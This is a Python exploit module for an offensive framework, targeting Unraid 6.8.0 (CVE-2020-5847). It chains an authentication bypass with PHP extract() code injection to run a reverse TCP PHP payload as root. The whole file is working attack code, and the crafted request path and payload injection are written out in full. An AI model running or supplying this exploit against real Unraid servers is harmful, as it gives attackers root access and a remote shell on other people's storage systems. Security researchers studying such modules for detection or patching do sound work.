from deathnote_module import *
from lib.http.http_client import Http_client

class Module(Exploit, Http_client):
	

	__info__ = {
		'name': "Unraid 6.8.0 Auth Bypass PHP Code Execution",
		'description': "This module exploits two vulnerabilities affecting Unraid 6.8.0"\
						"An authentication bypass is used to gain access to the administrative"\
						"interface, and an insecure use of the extract PHP function can be abused"\
						"for arbitrary code execution as root.",
		'cve': '2020-5847',
		'payload': {
			'default': 'payloads/singles/php/reverse_tcp',
			'arch': 'php',
			'category': 'singles',
			'encoder': 'encoders/php/base64'
			}			
		}	

	def run(self):

		payload = f'<?php {self.payload} ?>'

		r = self.http_request(
						method = "GET",
						path = f"/webGui/images/green-on.png/&path=x&site[x][text]={self.encode_uri(payload)}",
						)
		if r.status_code == 302:
			self.not_vulnerable()
